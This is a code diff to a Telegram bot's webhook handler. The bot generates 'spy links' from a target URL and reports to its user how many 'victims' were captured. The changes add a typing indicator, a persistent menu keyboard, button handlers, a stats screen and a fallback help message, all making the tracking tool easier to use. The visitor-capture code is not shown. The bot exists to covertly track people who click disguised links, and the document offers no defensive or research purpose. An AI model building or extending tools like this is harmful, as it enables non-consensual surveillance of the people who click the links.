@@ -10,6 +10,13 @@ from core.telegram import send_message, answer_callback
 from core.users import save_user, bump_links_count, broadcast_all_async
 from core.security import is_admin, check_force_join, send_force_join_prompt
 
+# ── Safe optional import for typing indicator ─────────────────
+try:
+    from core.telegram import send_chat_action
+except ImportError:
+    def send_chat_action(chat_id, action='typing'):
+        pass  # graceful no-op if not implemented in core
+
 bp = Blueprint('webhook', __name__)
 
 _pending = {}   # chat_id -> 'broadcast'
@@ -27,6 +34,17 @@ def _quote(text):
 
 def _header(title, emoji="✨"):
     return f"<b>{emoji} <u>{title}</u> {emoji}</b>\n{DIVIDER}"
+
+def _main_keyboard():
+    """Persistent bottom reply keyboard."""
+    return {
+        'keyboard': [
+            [{'text': '🔗 Create Link'}, {'text': '📊 My Stats'}],
+        ],
+        'resize_keyboard': True,
+        'is_persistent': True,
+        'input_field_placeholder': "Send a URL or use the menu…",
+    }
 
 
 @bp.route('/webhook', methods=['POST'])
@@ -84,6 +102,7 @@ def _handle_callback(cb):
 
     # ── Generate ────────────────────────────────────────────────
     if data == 'generate':
+        send_chat_action(from_id, 'typing')
         send_message(
             from_id,
             _header("Generate Spy Link", "🔗") + "\n\n"
@@ -95,6 +114,7 @@ def _handle_callback(cb):
 
     # ── Stats ───────────────────────────────────────────────────
     elif data == 'stats':
+        send_chat_action(from_id, 'typing')
         visitors = load_json('visitors.json')
         links = load_json('links.json')
         mine = [vid for vid, v in visitors.items() if str(v.get('generated_by')) == str(from_id)]
@@ -121,6 +141,7 @@ def _handle_callback(cb):
             )
             return 'OK', 200
 
+        send_chat_action(from_id, 'typing')
         users = load_json('users.json')
         lines = [_header("Registered Users", "👥"), ""]
         lines.append(f"👤 <b>Total Users:</b> <code>{len(users)}</code>\n")
@@ -192,13 +213,53 @@ def _handle_message(msg):
             + DIVIDER
         )
 
+        # Inline buttons + welcome
         send_message(chat_id, welcome, reply_markup=keyboard, parse_mode='HTML')
+
+        # Persistent bottom reply keyboard (separate message — Telegram allows only 1 reply_markup per message)
+        send_message(
+            chat_id,
+            "👇 <i>Quick menu below for instant access.</i>",
+            parse_mode='HTML',
+            reply_markup=_main_keyboard()
+        )
         return 'OK', 200
 
     # ── Force-join gate ─────────────────────────────────────────
     ok, missing = check_force_join(chat_id)
     if not ok and not is_admin(chat_id):
         send_force_join_prompt(chat_id, missing)
+        return 'OK', 200
+
+    # ── Reply-keyboard button text handlers ─────────────────────
+    if text == '🔗 Create Link':
+        send_chat_action(chat_id, 'typing')
+        send_message(
+            chat_id,
+            _header("Generate Spy Link", "🔗") + "\n\n"
+            + _quote("📥 <i>\"Every great mission starts with a single link.\"</i>") + "\n\n"
+            + "<b>Send target URL</b>\n"
+            + "👉 <code>https://youtube.com</code>",
+            parse_mode='HTML'
+        )
+        return 'OK', 200
+
+    if text == '📊 My Stats':
+        send_chat_action(chat_id, 'typing')
+        visitors = load_json('visitors.json')
+        links = load_json('links.json')
+        mine = [vid for vid, v in visitors.items() if str(v.get('generated_by')) == str(chat_id)]
+        my_links = [c for c, d in links.items() if str(d.get('created_by')) == str(chat_id)]
+
+        send_message(
+            chat_id,
+            _header("Your Statistics", "📊") + "\n\n"
+            + "🕵️ <b>Victims Captured:</b> <code>" + str(len(mine)) + "</code>\n"
+            + "🔗 <b>Spy Links Created:</b> <code>" + str(len(my_links)) + "</code>\n"
+            + DIVIDER + "\n"
+            + _quote("💬 <i>\"Know your numbers, master your mission.\"</i>"),
+            parse_mode='HTML'
+        )
         return 'OK', 200
 
     # ── /broadcast ──────────────────────────────────────────────
@@ -236,6 +297,8 @@ def _handle_message(msg):
 
     # ── URL → create link ───────────────────────────────────────
     if text.startswith('http'):
+        send_chat_action(chat_id, 'typing')
+
         domain = text.replace('https://', '').replace('http://', '').split('/')[0]
         domain = domain.replace('www.', '').replace('.', '_')
         short_code = f"{domain}_{str(int(time.time()))[-5:]}"
@@ -273,6 +336,25 @@ def _handle_message(msg):
             + _quote("💡 <i>\"Share it wisely — the link is now live.\"</i>")
         )
         send_message(chat_id, success, parse_mode='HTML')
+        return 'OK', 200
+
+    # ── Fallback for unknown text ───────────────────────────────
+    if text and not text.startswith('/'):
+        send_chat_action(chat_id, 'typing')
+        send_message(
+            chat_id,
+            _header("How Can I Help?", "🤖") + "\n\n"
+            + _quote("💡 <i>\"Send a URL to create a spy link.\"</i>") + "\n\n"
+            + "🔗 <b>Example:</b>\n"
+            + "<code>https://youtube.com</code>",
+            parse_mode='HTML',
+            reply_markup={
+                'inline_keyboard': [
+                    [{'text': '🔗  Generate Spy Link  🔗', 'callback_data': 'generate'}],
+                    [{'text': '📊  My Stats  📊',         'callback_data': 'stats'}],
+                ]
+            }
+        )
         return 'OK', 200
 
     return 'OK', 200
